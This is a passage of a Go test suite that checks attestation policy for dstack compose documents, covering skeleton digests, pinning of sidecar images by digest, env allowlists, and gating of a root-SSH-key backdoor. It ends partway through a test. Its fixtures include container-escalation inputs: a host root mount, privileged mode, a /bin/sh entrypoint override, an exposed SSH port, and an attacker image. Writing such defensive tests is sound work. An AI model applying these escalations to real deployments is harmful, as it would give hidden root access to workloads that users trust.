// TestHashGateRunsBeforeAnyFieldRule. Ordering IS the safety property:
// a policy verdict on an unverified document is a statement about
// whatever the node chose to send.
func TestHashGateRunsBeforeAnyFieldRule(t *testing.T) {
	// Clean by every field rule, but not the measured document.
	clean := `{"manifest_version":2,"runner":"docker-compose","docker_compose_file":"services: {}"}`
	measured := sealed(`{"manifest_version":2,"runner":"docker-compose","docker_compose_file":"something else"}`)

	_, err := VerifyAppCompose(clean, measured, ComposePolicy{})
	if !errors.Is(err, ErrComposeHashMismatch) {
		t.Fatalf("a policy-clean document was judged on its content: %v", err)
	}
	var pe *ComposePolicyError
	if errors.As(err, &pe) {
		t.Fatal("field rules ran against a document that failed the hash gate")
	}
}

func hasCode(v []Violation, c ViolationCode) bool {
	for _, x := range v {
		if x.Code == c {
			return true
		}
	}
	return false
}

// realisticCompose is the shape node/deploy/dstack/docker-compose.yaml.example
// produces: one service, the published image, and the operator's whole config
// as a literal block scalar.
func realisticCompose(image, config string) string {
	return "services:\n" +
		"  zs-node:\n" +
		"    image: " + image + "\n" +
		"    volumes:\n" +
		"      - /var/run/dstack.sock:/var/run/dstack.sock\n" +
		"      - zs-node-state:/data\n" +
		"    ports:\n" +
		"      - \"9090:9090\"\n" +
		"    environment:\n" +
		"      NODE_CONFIG_YAML: |\n" +
		config +
		"      NODE_LLM_OPENAI_API_KEY: ${NODE_LLM_OPENAI_API_KEY}\n" +
		"    restart: always\n" +
		"volumes:\n" +
		"  zs-node-state: {}\n"
}

// sidecarCompose is the sealed_local two-service shape: the node joins the
// engine's network namespace, so the engine owns the published port. Takes both
// images positionally rather than by role, because the vectors need to reorder
// them — which service is "first" is exactly what the lifting rule turns on.
func sidecarCompose(first, second string) string {
	return "services:\n" +
		"  zs-node:\n" +
		"    image: " + first + "\n" +
		"    network_mode: \"service:kronk\"\n" +
		"  kronk:\n" +
		"    image: " + second + "\n" +
		"    ports:\n" +
		"      - \"9090:9090\"\n"
}

const (
	realImage = "ghcr.io/txnlab/zs-node@sha256:" + strings64
	strings64 = "1111111111111111111111111111111111111111111111111111111111111111"
	// A sidecar engine reference, deliberately DIFFERENT from realImage so a
	// test that lifted the wrong one of the two fails on the ref rather than
	// passing because both strings happened to be equal.
	engineImage = "ghcr.io/ardanlabs/kronk@sha256:" +
		"2222222222222222222222222222222222222222222222222222222222222222"
	// A second engine digest, for the relation that pins "swapping the engine
	// is an edit to the measured artifact".
	otherEngineImage = "ghcr.io/ardanlabs/kronk@sha256:" +
		"3333333333333333333333333333333333333333333333333333333333333333"
	someConfig = "        zs:\n          operator_id: 1\n          node_id: 2\n"
)

// TestExtractComposeSkeleton_HidesOnlyTheTwoHoles is the core of the
// template-match design: two operators running the same release with
// DIFFERENT configs must produce the SAME skeleton, and anything else they
// change must produce a different one.
func TestExtractComposeSkeleton_HidesOnlyTheTwoHoles(t *testing.T) {
	base, ref, err := ExtractComposeSkeleton(realisticCompose(realImage, someConfig))
	if err != nil {
		t.Fatalf("extract: %v", err)
	}
	if ref != realImage {
		t.Fatalf("image ref = %q, want %q", ref, realImage)
	}
	if strings.Contains(base, "operator_id") {
		t.Error("the config block leaked into the skeleton, so two operators running " +
			"the same release would never match each other")
	}
	if strings.Contains(base, strings64) {
		t.Error("the image digest leaked into the skeleton, so it would have to be " +
			"re-listed on every release rather than checked against the image list")
	}

	// A completely different config, same release. Same skeleton, or the
	// per-release list becomes per-deployment again and the whole design
	// is back where it started.
	other, _, err := ExtractComposeSkeleton(realisticCompose(realImage,
		"        zs:\n          operator_id: 99\n"+
			"          node_id: 7\n\n"+ // blank line INSIDE the block
			"        llm:\n          provider: openai_passthrough\n"))
	if err != nil {
		t.Fatalf("extract: %v", err)
	}
	if other != base {
		t.Errorf("two configs of the same release produced different skeletons:\n%q\n%q",
			base, other)
	}

	// A different release image, same shape: also the same skeleton. The
	// image is checked on its own list.
	diffImage, ref2, err := ExtractComposeSkeleton(realisticCompose(
		"ghcr.io/txnlab/zs-node@sha256:2222222222222222222222222222222222222222222222222222222222222222",
		someConfig))
	if err != nil {
		t.Fatalf("extract: %v", err)
	}
	if diffImage != base {
		t.Error("changing the image digest moved the skeleton")
	}
	if ref2 == ref {
		t.Fatal("the two image refs came back identical, so the assertion above is vacuous")
	}
}

// TestExtractComposeSkeleton_CatchesEverythingElse is the half that makes
// the design worth anything. Nothing enumerates what is forbidden — the
// claim is that anything not in the published compose changes the skeleton.
// Each case below is a real escalation, and each must move the digest.
func TestExtractComposeSkeleton_CatchesEverythingElse(t *testing.T) {
	base, _, err := ExtractComposeSkeleton(realisticCompose(realImage, someConfig))
	if err != nil {
		t.Fatalf("extract: %v", err)
	}
	baseDigest := ComposeSkeletonDigest(base)

	cases := map[string]string{
		"host bind mount": strings.Replace(realisticCompose(realImage, someConfig),
			"      - zs-node-state:/data\n",
			"      - zs-node-state:/data\n      - /:/host\n", 1),
		"privileged": strings.Replace(realisticCompose(realImage, someConfig),
			"    restart: always\n", "    privileged: true\n    restart: always\n", 1),
		"entrypoint override": strings.Replace(realisticCompose(realImage, someConfig),
			"    restart: always\n", "    entrypoint: [/bin/sh]\n    restart: always\n", 1),
		"extra port": strings.Replace(realisticCompose(realImage, someConfig),
			"      - \"9090:9090\"\n", "      - \"9090:9090\"\n      - \"22:22\"\n", 1),
		"extra env name": strings.Replace(realisticCompose(realImage, someConfig),
			"    restart: always\n",
			"      NODE_TEE_DATAFLOW: sealed_local\n    restart: always\n", 1),
		"second service": realisticCompose(realImage, someConfig) +
			"  sidecar:\n    restart: always\n",
	}
	for name, doc := range cases {
		t.Run(name, func(t *testing.T) {
			skel, _, err := ExtractComposeSkeleton(doc)
			if err != nil {
				// Refusing to extract is also a pass: the caller
				// records it as a compose_skeleton violation.
				return
			}
			if ComposeSkeletonDigest(skel) == baseDigest {
				t.Errorf("%s did not move the skeleton digest — it would pass as a "+
					"published release compose", name)
			}
		})
	}
}

// TestExtractComposeSkeleton_BlockWalkNeverOverruns is the one direction of
// the block-scalar walk that is a HOLE rather than merely strict.
//
// Consuming too few lines is safe: the leftovers stay in the skeleton and
// the digest stops matching. Consuming too many swallows real compose
// directives into the span nobody checks — so a `privileged: true` written
// at the sibling indentation, immediately after the config block, must NOT
// disappear into it.
func TestExtractComposeSkeleton_BlockWalkNeverOverruns(t *testing.T) {
	doc := "services:\n  zs-node:\n    image: " + realImage + "\n" +
		"    environment:\n" +
		"      NODE_CONFIG_YAML: |\n" +
		"        zs:\n          operator_id: 1\n" +
		// Sibling of NODE_CONFIG_YAML (6 spaces), so YAML ends the
		// scalar here. A walk keying on "deeper than the block body"
		// rather than "deeper than the key" would swallow it.
		"      NODE_TEE_DATAFLOW: sealed_local\n" +
		"    privileged: true\n"
	skel, _, err := ExtractComposeSkeleton(doc)
	if err != nil {
		t.Fatalf("extract: %v", err)
	}
	for _, want := range []string{"NODE_TEE_DATAFLOW", "privileged"} {
		if !strings.Contains(skel, want) {
			t.Errorf("%s was swallowed into the config block, where nothing checks it:\n%s",
				want, skel)
		}
	}
}

func TestExtractComposeSkeleton_Refusals(t *testing.T) {
	// A tab makes "indented deeper" ambiguous, which is exactly the
	// ambiguity the walk's safety depends on not existing.
	if _, _, err := ExtractComposeSkeleton("services:\n\timage: x\n"); !errors.Is(err, ErrComposeTabIndent) {
		t.Errorf("tab indentation was accepted: %v", err)
	}
	// No image: nothing identifies the code being run.
	if _, _, err := ExtractComposeSkeleton("services:\n  zs-node:\n    restart: always\n"); !errors.Is(err, ErrComposeNoImage) {
		t.Errorf("a compose with no image was accepted: %v", err)
	}
}

// TestExtractComposeSkeleton_SecondImageIsPinnedNotLifted covers the sealed_local
// sidecar shape, where the document carries a second `image:` for the inference
// engine.
//
// The property is narrow and every half of it matters. The FIRST reference is
// the one lifted and handed to the release-list check, and the second must
// survive INTO the skeleton verbatim — because that is what makes the engine
// digest something an operator cannot vary. A change that dropped the second
// image, or lifted it instead, or swallowed it into a placeholder, would leave
// the extractor returning a perfectly well-formed skeleton over an engine
// nobody pinned, and no other test in this file would notice.
func TestExtractComposeSkeleton_SecondImageIsPinnedNotLifted(t *testing.T) {
	doc := realisticCompose(realImage, someConfig) +
		"  kronk:\n    image: " + engineImage + "\n"

	skel, ref, err := ExtractComposeSkeleton(doc)
	if err != nil {
		t.Fatalf("a sidecar compose was refused: %v", err)
	}
	if ref != realImage {
		t.Errorf("lifted the wrong image: got %q, want the FIRST one %q", ref, realImage)
	}
	if !strings.Contains(skel, engineImage) {
		t.Errorf("the engine image is not in the skeleton, so nothing pins it:\n%s", skel)
	}
	// The placeholder must appear exactly once. Twice would mean the engine was
	// lifted too, which is the design this rejects: two refs against one flat
	// TrustedNodeImages list lets a released engine pass as a released node.
	if got := strings.Count(skel, skeletonImagePlaceholder); got != 1 {
		t.Errorf("placeholder count = %d, want 1 (only the first image is lifted)", got)
	}

	// Swapping the engine MUST move the skeleton. If it did not, the release
	// digest would say nothing about which engine runs beside the node —
	// exactly the hole leaving it literal is meant to close.
	other := realisticCompose(realImage, someConfig) +
		"  kronk:\n    image: ghcr.io/attacker/kronk@sha256:" + strings64 + "\n"
	otherSkel, otherRef, err := ExtractComposeSkeleton(other)
	if err != nil {
		t.Fatalf("swapped-engine compose was refused: %v", err)
	}
	if otherRef != ref {
		t.Errorf("swapping the engine moved the lifted ref: %q vs %q", otherRef, ref)
	}
	if ComposeSkeletonDigest(otherSkel) == ComposeSkeletonDigest(skel) {
		t.Error("swapping the engine image left the skeleton digest unchanged")
	}
}

// TestExtractComposeSkeleton_LiftsTheFirstImageOnly pins the tie-breaker the
// rule above depends on. Reordering the services must not quietly re-point the
// release-list check at the engine while still producing SOME skeleton — it has
// to produce a DIFFERENT one, so the published digest refuses it.
func TestExtractComposeSkeleton_LiftsTheFirstImageOnly(t *testing.T) {
	nodeFirst := "services:\n  zs-node:\n    image: " + realImage +
		"\n  kronk:\n    image: " + engineImage + "\n"
	engineFirst := "services:\n  kronk:\n    image: " + engineImage +
		"\n  zs-node:\n    image: " + realImage + "\n"

	skel1, ref1, err := ExtractComposeSkeleton(nodeFirst)
	if err != nil {
		t.Fatalf("node-first: %v", err)
	}
	skel2, ref2, err := ExtractComposeSkeleton(engineFirst)
	if err != nil {
		t.Fatalf("engine-first: %v", err)
	}
	if ref1 != realImage {
		t.Errorf("node-first lifted %q, want %q", ref1, realImage)
	}

	// EXACT BYTES, not a containment check. "Literal text" is the entire claim
	// about the second image, and `strings.Contains` survives a regression that
	// re-indents it, normalizes its whitespace, or moves it elsewhere in the
	// document. These fixtures carry no config block, so the whole skeleton is
	// assertable — and asserting it is what pins that the first image's line is
	// replaced in place while the second's is copied through untouched.
	want1 := "services:\n  zs-node:\n    image: " + skeletonImagePlaceholder +
		"\n  kronk:\n    image: " + engineImage + "\n"
	if skel1 != want1 {
		t.Errorf("node-first skeleton:\n got %q\nwant %q", skel1, want1)
	}

	// The NORMALIZATION half of that claim needs a non-canonical line to bite
	// on. Written canonically above, `out = append(out, line)` and
	// `out = append(out, indent+"image: "+ref)` emit identical bytes, so the
	// exact comparison catches relocation and dropping but not rewriting —
	// that second mutant survived the whole suite. Extra interior and trailing
	// spaces here make the two visibly different.
	odd := "services:\n  zs-node:\n    image: " + realImage +
		"\n  kronk:\n    image:   " + engineImage + "  \n"
	skelOdd, _, err := ExtractComposeSkeleton(odd)
	if err != nil {
		t.Fatalf("odd-spacing: %v", err)
	}
	wantOdd := "services:\n  zs-node:\n    image: " + skeletonImagePlaceholder +
		"\n  kronk:\n    image:   " + engineImage + "  \n"
	if skelOdd != wantOdd {
		t.Errorf("a non-canonical second image line was rewritten rather than "+
			"copied:\n got %q\nwant %q", skelOdd, wantOdd)
	}

	// The reorder is refused twice over, and both are asserted because either
	// alone would still admit the document if the other regressed: the ref
	// handed to the release-list check is now the engine's, and the structure
	// moved as well.
	if ref2 != engineImage {
		t.Errorf("engine-first lifted %q, want %q", ref2, engineImage)
	}
	want2 := "services:\n  kronk:\n    image: " + skeletonImagePlaceholder +
		"\n  zs-node:\n    image: " + realImage + "\n"
	if skel2 != want2 {
		t.Errorf("engine-first skeleton:\n got %q\nwant %q", skel2, want2)
	}
	if ComposeSkeletonDigest(skel1) == ComposeSkeletonDigest(skel2) {
		t.Error("reordering the services left the skeleton digest unchanged")
	}
}

// TestExtractComposeSkeleton_SidecarMustBePinnedByDigest is the rule that makes
// the "literal text" pin mean anything.
//
// A second image is compared against NO release list — the skeleton is its only
// check — so if its bytes can stand for something chosen later, the skeleton
// pins nothing. dstack hashes docker_compose_file BEFORE expanding `${VAR}`, so
// a release written `image: ${ENGINE_IMAGE}` would publish one digest under
// which any engine runs, in the process that sees plaintext prompts. That is
// the same attack TrustedNodeImages exists to stop for the FIRST image, and the
// reason the first is not left to release-authoring discipline either.
func TestExtractComposeSkeleton_SidecarMustBePinnedByDigest(t *testing.T) {
	refused := []struct{ name, ref string }{
		{"env substitution", "${ENGINE_IMAGE}"},
		{"tag", "ghcr.io/ardanlabs/kronk:latest-cuda"},
		{"bare name", "kronk"},
		{"short digest", "ghcr.io/ardanlabs/kronk@sha256:abc123"},
		// The upper bound needs its own case: every other refusal here is too
		// SHORT, so `len(digest) != 64` relaxed to `< 64` passed the whole
		// suite. It is also the one comparison whose two implementations count
		// different units — Go bytes, TS UTF-16 code units.
		{"long digest", "ghcr.io/ardanlabs/kronk@sha256:" + strings.Repeat("a", 65)},
		// Spelled with letters, NOT ToUpper(strings64): that constant is all
		// digits, so upper-casing it is a no-op and the case asserted nothing.
		{"uppercase digest", "ghcr.io/ardanlabs/kronk@sha256:" + strings.Repeat("ABCDEF01", 8)},
		{"empty repository", "@sha256:" + strings64},
		{"wrong algorithm", "ghcr.io/ardanlabs/kronk@sha512:" + strings64},
		// `${VAR}` in the REPOSITORY half, digest literal. This one genuinely
		// content-addresses the bytes, so it is not an escape — it is refused
		// because the rule is spelled `<repository>@sha256:<hex>` and because
		// three documents assert "a `${VAR}` is not a pin" without qualifying
		// which half they mean.
		{"interpolated repository", "${ENGINE_REPO}@sha256:" + strings64},
	}
	for _, tc := range refused {
		t.Run(tc.name, func(t *testing.T) {
			doc := "services:\n  zs-node:\n    image: " + realImage +
				"\n  kronk:\n    image: " + tc.ref + "\n"
			if _, _, err := ExtractComposeSkeleton(doc); !errors.Is(err, ErrComposeUnpinnedSidecar) {
				t.Errorf("an unpinned sidecar %q was accepted: %v", tc.ref, err)
			}
		})
	}

	// The FIRST image is deliberately NOT held to this rule: it is lifted to a
	// placeholder and checked against TrustedNodeImages, which is a stronger
	// check than a shape test. Refusing it here would reject the release
	// compose's own `${VAR}` first line for a property already covered.
	doc := "services:\n  zs-node:\n    image: ${NODE_IMAGE}\n  kronk:\n    image: " +
		engineImage + "\n"
	if _, ref, err := ExtractComposeSkeleton(doc); err != nil {
		t.Errorf("an unpinned FIRST image must still extract (the release list judges it): %v", err)
	} else if ref != "${NODE_IMAGE}" {
		t.Errorf("lifted %q, want the unexpanded first ref", ref)
	}
}

// TestComposeSkeletonPolicy_FailsClosed. These lists are per-RELEASE data
// each consumer ships on its own cadence, so the state that matters is a
// build whose list has not been populated yet.
func TestComposeSkeletonPolicy_FailsClosed(t *testing.T) {
	doc := mustMarshal(t, map[string]any{
		"manifest_version":    2,
		"runner":              "docker-compose",
		"docker_compose_file": realisticCompose(realImage, someConfig),
	})

	// Enforcing with empty lists must refuse, not wave through.
	p := ComposePolicy{EnforceComposeSkeleton: true}
	if _, err := VerifyAppCompose(doc, sealed(doc), p); err == nil {
		t.Fatal("an empty release list verified a node — an unpopulated build would " +
			"accept any compose while looking like the check was on")
	}

	// And the flag must actually gate: without it, the same document is
	// judged on its other fields only.
	if _, err := VerifyAppCompose(doc, sealed(doc), ComposePolicy{}); err != nil {
		t.Fatalf("the skeleton check ran with EnforceComposeSkeleton unset: %v", err)
	}

	// Populated lists accept the real thing.
	skel, ref, err := ExtractComposeSkeleton(realisticCompose(realImage, someConfig))
	if err != nil {
		t.Fatalf("extract: %v", err)
	}
	p.TrustedComposeSkeletons = []string{ComposeSkeletonDigest(skel)}
	p.TrustedNodeImages = []string{ref}
	if _, err := VerifyAppCompose(doc, sealed(doc), p); err != nil {
		t.Fatalf("the published release compose was refused: %v", err)
	}

	// The image is a SEPARATE list, so a right-shape compose running an
	// unpublished image must still fail.
	p.TrustedNodeImages = []string{"ghcr.io/txnlab/zs-node@sha256:" +
		"3333333333333333333333333333333333333333333333333333333333333333"}
	err = VerifyAppComposeErr(t, doc, p)
	if !hasCodeIn(err, ViolationNodeImage) {
		t.Fatalf("an unpublished image passed: %v", err)
	}
}

// TestComposeSkeletonPolicy_UnextractableIsAViolation covers the branch the
// refusal tests above do NOT reach. They call ExtractComposeSkeleton directly
// and assert it refuses; this asserts the half nobody was testing — that
// VerifyAppCompose turns that refusal into a violation instead of a pass.
//
// The distinction is the whole fail-open. Extraction failing means the
// document could not be reduced to something comparable against the release
// list, so there is no digest to compare and the default branch is skipped.
// Delete the add() and an unextractable compose verifies CLEAN against a fully
// populated policy — a compose nobody could read becomes a compose nobody
// objected to, which is a strictly better outcome for an attacker than
// publishing a wrong one. Notably it is reachable by writing a compose that
// simply cannot be parsed, so it needs no knowledge of the release list at all.
func TestComposeSkeletonPolicy_UnextractableIsAViolation(t *testing.T) {
	// Populated, so a surviving mutation cannot hide behind the
	// empty-list refusal that TestComposeSkeletonPolicy_FailsClosed pins.
	skel, ref, err := ExtractComposeSkeleton(realisticCompose(realImage, someConfig))
	if err != nil {
		t.Fatalf("extract: %v", err)
	}
	p := ComposePolicy{
		EnforceComposeSkeleton:  true,
		TrustedComposeSkeletons: []string{ComposeSkeletonDigest(skel)},
		TrustedNodeImages:       []string{ref},
	}

	for name, compose := range map[string]string{
		"tab indent": "services:\n\timage: " + realImage + "\n",
		"no image":   "services:\n  zs-node:\n    restart: always\n",
		"two images": realisticCompose(realImage, someConfig) + "  other:\n    image: alpine\n",
	} {
		t.Run(name, func(t *testing.T) {
			doc := mustMarshal(t, map[string]any{
				"manifest_version":    2,
				"runner":              "docker-compose",
				"docker_compose_file": compose,
			})
			err := VerifyAppComposeErr(t, doc, p)
			if !hasCodeIn(err, ViolationComposeSkeleton) {
				t.Fatalf("a compose that cannot be read as a release compose "+
					"passed the skeleton gate: %v", err)
			}
			// The detail is prose, but it is prose two implementations
			// show side by side, and Go's sentinel carries a package
			// prefix TS has no equivalent of. Stripping it is a
			// deliberate line in compose.go, not incidental formatting.
			var pe *ComposePolicyError
			if errors.As(err, &pe) {
				for _, v := range pe.Violations {
					if v.Code == ViolationComposeSkeleton && strings.Contains(v.Detail, "attest: ") {
						t.Errorf("the detail leaks Go's sentinel prefix, which the "+
							"TS twin cannot produce: %q", v.Detail)
					}
				}
			}
		})
	}
}

func VerifyAppComposeErr(t *testing.T, doc string, p ComposePolicy) error {
	t.Helper()
	_, err := VerifyAppCompose(doc, sealed(doc), p)
	return err
}

func hasCodeIn(err error, c ViolationCode) bool {
	var pe *ComposePolicyError
	if !errors.As(err, &pe) {
		return false
	}
	return hasCode(pe.Violations, c)
}

// goSkeletonDigestFixture is the skeleton digest of realisticCompose's
// output, pinned so the TypeScript mirror can assert the same value.
//
// A LITERAL, deliberately, and this is the one place in this file where that
// is right. Everywhere else a hardcoded digest would only prove the code
// agrees with itself; here the point is that a SECOND implementation, in
// another language, reduces the same bytes to the same value. Neither side
// can drift without one of the two tests failing.
const goSkeletonDigestFixture = "b66a7d03d5c42a4094a9d0042bd6950ee9304d4837b9fe75c447a699115e7ad6"

// TestSkeletonDigest_GoTSParity pins the value proto/ts asserts against.
//
// The two skeleton walkers are separate line-oriented implementations in
// separate languages. A divergence is not a crash — it is the proxy and the
// browser client reaching opposite verdicts on identical evidence, which is
// the failure mode the whole one-implementation-per-language rule exists to
// prevent, and it is invisible without a test that spans both.
func TestSkeletonDigest_GoTSParity(t *testing.T) {
	skel, _, err := ExtractComposeSkeleton(realisticCompose(realImage, someConfig))
	if err != nil {
		t.Fatalf("extract: %v", err)
	}
	got := ComposeSkeletonDigest(skel)
	if got != goSkeletonDigestFixture {
		t.Fatalf("skeleton digest = %s, pinned %s\n\n"+
			"If this moved deliberately, update BOTH this constant and "+
			"GO_SKELETON_DIGEST in proto/ts/test/attest-compose.test.ts — "+
			"updating one leaves the two implementations agreeing with "+
			"themselves and not with each other.", got, goSkeletonDigestFixture)
	}
}

// TestZeroSignalComposePolicy_AgainstTheRealCapture pins the shared policy
// to the one document a live CVM is known to have measured.
//
// The capture is the PROBE deployment rather than a zs-node one, so it is a
// NEGATIVE fixture — and that is what makes it worth having. A policy tested
// only against a document written from it agrees with itself; this one has to
// name the specific things wrong with a real compose, and each is a thing the
// policy exists to catch.
func TestZeroSignalComposePolicy_AgainstTheRealCapture(t *testing.T) {
	rawLog, quote := loadVectors(t)
	measurements, err := VerifyEventLog(rawLog, quote)
	if err != nil {
		t.Fatalf("capture does not replay: %v", err)
	}

	_, err = VerifyAppCompose(loadAppCompose(t), measurements, ZeroSignalComposePolicy())
	if err == nil {
		t.Fatal("the probe capture passed the ZeroSignal policy — it installs a root " +
			"SSH key and declares five probe variables, so a policy accepting it " +
			"is enforcing nothing")
	}
	var pe *ComposePolicyError
	if !errors.As(err, &pe) {
		t.Fatalf("err = %v, want a *ComposePolicyError carrying the violations", err)
	}

	got := map[ViolationCode]int{}
	for _, v := range pe.Violations {
		got[v.Code]++
	}
	// COUNTED, not merely present. "At least one violation" is satisfied
	// by the unconditional backdoor rule alone, so it would still pass
	// with EnforceEnvAllowlist switched off — which is the single most
	// load-bearing field in the policy.
	if got[ViolationRootBackdoorEnv] != 1 {
		t.Errorf("root_backdoor_env fired %d×, want 1 (DSTACK_AUTHORIZED_KEYS)",
			got[ViolationRootBackdoorEnv])
	}
	if got[ViolationEnvNotAllowed] != 5 {
		t.Errorf("env_not_allowed fired %d×, want 5 (the probe's own variables); "+
			"0 means EnforceEnvAllowlist is off", got[ViolationEnvNotAllowed])
	}
	// manifest_version, runner and local_key_provider_enabled all match
	// the capture, so none of them can be what failed above. One of these
	// firing means the policy pins a value no live Phala CVM has — which
	// would refuse every honest node while every test about refusal still
	// passed.
	for _, unwanted := range []ViolationCode{
		ViolationManifestVersion, ViolationRunner,
		ViolationToggle, ViolationPreLaunchScript, ViolationEmptyDockerCompose,
	} {
		if got[unwanted] != 0 {
			t.Errorf("%s fired on the real capture (%d×) — the policy pins a value "+
				"a live Phala CVM does not have", unwanted, got[unwanted])
		}
	}
}

// TestZeroSignalComposePolicy_AcceptsTheSecretChannel is the positive half.
// Without it everything above is satisfied by a policy that refuses
// everything — which takes every honest node off the network while looking
// maximally secure.
// TestZeroSignalSecretEnvNames_Literal pins the list by VALUE, which nothing
// on this side did.
//
// Every other assertion about it feeds the list back into the policy
// (`TestZeroSignalComposePolicy_AcceptsTheSecretChannel` below builds its
// fixture from `ZeroSignalSecretEnvNames()`), so it agrees with itself for any
// contents. The golden vectors do not close it either: they are GENERATED from
// this slice, so deleting a name and regenerating leaves both languages green
// — the staleness check catches only a deletion someone forgot to regenerate.
//
// That matters more here than almost anywhere else in the package. Adding a
// name widens the unmeasured env channel, and the whole "the configuration is
// inside the measurement" claim rests on this list staying short: the node's
// applyEnv reads ~119 distinct NODE_* names and runs AFTER the measured
// NODE_CONFIG_YAML is unmarshalled, so any name admitted here is an unmeasured
// override of the measured document.
//
// So: adding a line below is a decision, and it should be one someone made on
// purpose. Every entry must carry a credential and reach no setting.
func TestZeroSignalSecretEnvNames_Literal(t *testing.T) {
	want := []string{
		"NODE_ALGOD_TOKEN",
		"NODE_IMAGE_LLM_OPENAI_API_KEY",
		"NODE_LLM_COMFYUI_CLOUD_API_KEY",
		"NODE_LLM_OPENAI_API_KEY",
		"ZS_MNEMONIC_URLS",
	}
	got := append([]string{}, ZeroSignalSecretEnvNames()...)
	sort.Strings(got)
	if !slices.Equal(got, want) {
		t.Errorf("ZeroSignalSecretEnvNames() = %v, want %v\n\n"+
			"A name ADDED here is a new unmeasured override path — confirm it "+
			"carries a credential and reaches no setting. A name REMOVED breaks "+
			"every node using it. Either way, update proto/ts's twin and "+
			"regenerate the compose vectors in the same change.", got, want)
	}
}

func TestZeroSignalComposePolicy_AcceptsTheSecretChannel(t *testing.T) {
	p := ZeroSignalComposePolicy()

	names := append([]string{}, ZeroSignalSecretEnvNames()...)
	// The suffix channel. proto/go/keystore loads any <PREFIX>_MNEMONIC,
	// so the prefix is operator-chosen and cannot be enumerated; the
	// lowercase entry also pins the case-insensitive match.
	names = append(names, "OPERATOR_SIGNING_MNEMONIC", "some_payment_mnemonic")

	doc := composeWithEnvs(t, names)
	if _, err := VerifyAppCompose(doc, sealed(doc), p); err != nil {
		t.Fatalf("the policy rejects the deployment's own secret channel: %v", err)
	}

	// And what the suffix must never become. applyEnv runs AFTER the
	// measured NODE_CONFIG_YAML, so each of these rewrites the measured
	// document through the unmeasured channel, and declaring the NAME is
	// the only part that moves compose_hash — so this is exactly the
	// substitution a remote verifier can still catch.
	for _, bad := range []string{
		"NODE_LLM_OPENAI_BASE_URL", // redirects the one upstream rung 1 names
		"NODE_TEE_DATAFLOW",        // rewrites the claim itself
		"NODE_CONFIG_YAML",         // the measured document, unmeasured
		"MNEMONIC",                 // no leading underscore: must not match the suffix
		"NOT_A_MNEMONIC_KEY",       // contains the suffix without ending in it
	} {
		doc := composeWithEnvs(t, []string{bad})
		if _, err := VerifyAppCompose(doc, sealed(doc), p); err == nil {
			t.Errorf("%s was accepted into the unmeasured env channel", bad)
		}
	}
}

// TestAllowedEnvSuffixes_MalformedEntriesAreIgnored covers the guard the
// test above cannot reach.
//
// That one varies the env NAME, which a correct suffix rejects on its own —
// so it stays green with the anchor guard deleted (measured). The guard is
// about a malformed POLICY, and the failure it prevents is a widening: a
// suffix with no leading underscore matches any name merely ending in those
// letters, so a policy meaning "permit key material" would quietly permit
// NODE_LLM_OPENAI_API_KEY and every other config name ending in KEY.
//
// Ignoring a malformed entry rather than honouring it is what keeps a typo
// from being an unnoticed hole.
func TestAllowedEnvSuffixes_MalformedEntriesAreIgnored(t *testing.T) {
	// Each malformed suffix is paired with a name that ENDS in it, and the
	// document carries THAT NAME ALONE. One name per case is load-bearing:
	// with a second, still-refused name in the document the call errors
	// either way and the anchor guard can be deleted with this test green
	// (measured — that is exactly how the first version of it passed).
	for _, tc := range []struct{ suffix, name string }{
		{"KEY", "NODE_LLM_OPENAI_BASE_URL_KEY"},
		{"MNEMONIC", "NODE_TEE_DATAFLOW_MNEMONIC"},
		{"", "NODE_TEE_DATAFLOW"},
		{"   ", "NODE_TEE_DATAFLOW"},
	} {
		p := ComposePolicy{EnforceEnvAllowlist: true, AllowedEnvSuffixes: []string{tc.suffix}}
		doc := composeWithEnvs(t, []string{tc.name})
		if _, err := VerifyAppCompose(doc, sealed(doc), p); err == nil {
			t.Errorf("suffix %q admitted %s — a malformed entry must be ignored, "+
				"not matched", tc.suffix, tc.name)
		}
	}

	// The counterpart, or the above is satisfied by a suffix rule that
	// never matches anything at all.
	p := ComposePolicy{EnforceEnvAllowlist: true, AllowedEnvSuffixes: []string{"_MNEMONIC"}}
	doc := composeWithEnvs(t, []string{"OPERATOR_SIGNING_MNEMONIC"})
	if _, err := VerifyAppCompose(doc, sealed(doc), p); err != nil {
		t.Fatalf("a well-formed suffix matched nothing: %v", err)
	}
}

// ---------------------------------------------------------------------------
// The image gate on a root-backdoor concession
// ---------------------------------------------------------------------------

// backdoorDoc is the minimal document that trips the root-backdoor rule.
func backdoorDoc() string {
	return `{"manifest_version":2,"runner":"docker-compose",` +
		`"docker_compose_file":"services: {}",` +
		`"allowed_envs":["DSTACK_ROOT_PUBLIC_KEY"]}`
}

// TestRootBackdoorExemption_NeedsAKnownSafeImage is the guard, and every case
// below is a REFUSAL because that is the direction that can go wrong silently.
//
// The concession is defensible only on a guest image with no way to consume an
// authorized_keys file. Before this gate the concession was a property of the
// POLICY and was honoured against whatever image booted, so adding a digest to a
// caller's trusted-image list quietly extended a root-shell carve-out to it. The
// table is the four ways a caller can fail to establish the precondition; all
// four must refuse rather than concede.
func TestRootBackdoorExemption_NeedsAKnownSafeImage(t *testing.T) {
	doc := backdoorDoc()
	safe := safeImage()

	for _, tc := range []struct {
		name  string
		meas  map[string]string
		safeL []string
	}{
		{
			// The shape this gate exists for: a caller names the
			// concession and forgets the image set. Empty honours
			// nothing, matching TrustedOSImages.
			name: "no safe-image list",
			meas: sealedOn(doc, safe),
		},
		{
			// A replay that recovered no os-image-hash cannot
			// establish the precondition, so it must not be read as
			// satisfying it.
			name:  "no os-image-hash in the replay",
			meas:  sealed(doc),
			safeL: OSImagesWithoutSSHDaemon(),
		},
		{
			// TRUSTED IS NOT SCANNED. The GPU line's production image
			// is in TrustedDstackOSImages and deliberately not in
			// OSImagesWithoutSSHDaemon — its 497MB rootfs has never
			// been enumerated. A node there gets the strict rule.
			name:  "a trusted image that has not been scanned",
			meas:  sealedOn(doc, "806a352e16175d90568de97dff563f31f680239e6b90e9b5b2e9141d0955b0d9"),
			safeL: OSImagesWithoutSSHDaemon(),
		},
		{
			name:  "an image nobody has heard of",
			meas:  sealedOn(doc, strings.Repeat("ab", 32)),
			safeL: OSImagesWithoutSSHDaemon(),
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			p := ComposePolicy{
				AllowedRootBackdoorEnvs:  []string{"DSTACK_ROOT_PUBLIC_KEY"},
				RootBackdoorSafeOSImages: tc.safeL,
			}
			_, ex, err := VerifyUpstreamAppCompose(doc, tc.meas, p)
			var pe *ComposePolicyError
			if !errors.As(err, &pe) || !hasCode(pe.Violations, ViolationRootBackdoorEnv) {
				t.Fatalf("the concession was honoured without a safe image: err=%v", err)
			}
